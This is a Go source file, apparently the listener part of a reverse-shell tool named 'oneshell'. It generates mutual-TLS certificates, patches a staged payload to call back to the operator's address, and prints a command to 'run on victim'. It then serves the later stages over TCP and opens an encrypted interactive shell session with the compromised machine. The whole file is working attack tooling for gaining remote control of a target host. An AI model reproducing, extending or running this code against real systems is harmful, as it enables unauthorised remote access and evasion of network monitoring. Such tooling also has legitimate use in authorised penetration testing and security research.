package pkg

import (
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	_ "embed"
	"fmt"
	"io"
	"log"
	"net"
	"os"

	"github.com/tantosec/oneshell/pkg/patching"
)

func resolveIP(target string) (net.IP, error) {
	targetIPs, err := net.LookupIP(target)
	if err != nil {
		return nil, err
	}

	for _, currIp := range targetIPs {
		if ipv4 := currIp.To4(); ipv4 != nil {
			return ipv4, nil
		}
	}

	return nil, fmt.Errorf("could not resolve hostname %v to ip", target)
}

func Listen(target string, port uint16) error {
	targetIP, err := resolveIP(target)
	if err != nil {
		return fmt.Errorf("failed to resolve hostname %v", target)
	}

	fmt.Println("Generating temporary MTLS certificates...")
	serverCert, serverKey, err := generateCertificate(targetIP)
	if err != nil {
		return err
	}
	clientCert, clientKey, err := generateCertificate(nil)
	if err != nil {
		return err
	}

	secretKey := make([]byte, 16)
	_, err = rand.Read(secretKey)
	if err != nil {
		return err
	}

	clientPatched, err := patching.PatchAndEncryptClient(targetIP, port, serverCert, clientCert, clientKey, secretKey)
	if err != nil {
		return err
	}
	stage2Patched := patching.PatchStage2(targetIP, port)
	stage1Patched, err := patching.PatchStage1(targetIP, port, stage2Patched, secretKey)
	if err != nil {
		return err
	}

	fmt.Printf("Payload connects to %v:%v", targetIP, port)
	fmt.Println()
	fmt.Println("Copy the following command and run on victim:")
	fmt.Println()
	fmt.Println(RunEchoifiedBinary(stage1Patched))
	fmt.Println()

	if err := sendStages(port, stage2Patched, clientPatched); err != nil {
		return err
	}

	log.Println("Client should have started. Awaiting second connection...")

	return receiveClient(port, serverCert, serverKey, clientCert)
}

func acceptTcp(port uint16) (net.Conn, error) {
	listener, err := net.Listen("tcp", fmt.Sprintf(":%v", port))
	if err != nil {
		return nil, fmt.Errorf("listen: failed to listen on port %v: %v", port, err)
	}

	log.Printf("Listening for connections on 0.0.0.0:%v\n", port)
	defer listener.Close()

	conn, err := listener.Accept()
	if err != nil {
		return nil, fmt.Errorf("listen: failed to receive connection: %v", err)
	}

	log.Printf("Connection accepted from %v\n", conn.RemoteAddr())

	return conn, nil
}

func sendStages(port uint16, stage2Patched []byte, clientPatched []byte) error {
	if err := stage1To2(port, stage2Patched); err != nil {
		return err
	}
	return stage2ToClient(port, clientPatched)
}

func stage1To2(port uint16, stage2Data []byte) error {
	conn, err := acceptTcp(port)
	if err != nil {
		return err
	}
	defer conn.Close()

	log.Println("Sending stage 2 data...")
	_, err = conn.Write(stage2Data)

	return err
}

func stage2ToClient(port uint16, clientData []byte) error {
	conn, err := acceptTcp(port)
	if err != nil {
		return err
	}
	defer conn.Close()

	log.Println("Sending client data...")

	_, err = conn.Write(clientData)
	return err
}

func receiveClient(port uint16, serverCert []byte, serverKey []byte, clientCert []byte) error {
	cert, err := tls.X509KeyPair(serverCert, serverKey)
	if err != nil {
		return fmt.Errorf("failed to load server key pair: %v", err)
	}

	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(clientCert)

	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		ClientAuth:   tls.RequireAndVerifyClientCert,
		ClientCAs:    caCertPool,
	}

	listener, err := tls.Listen("tcp", fmt.Sprintf(":%v", port), tlsConfig)
	if err != nil {
		return fmt.Errorf("listen: failed to listen on port %v: %v", port, err)
	}
	defer listener.Close()

	clientConn, err := listener.Accept()
	if err != nil {
		return err
	}

	log.Printf("Second connection received from %v\n", clientConn.RemoteAddr())

	fmt.Println()
	fmt.Println("=== BEGIN SHELL SESSION ===")
	fmt.Println()

	go io.Copy(clientConn, os.Stdout)

	_, err = io.Copy(os.Stdin, clientConn)

	return err
}
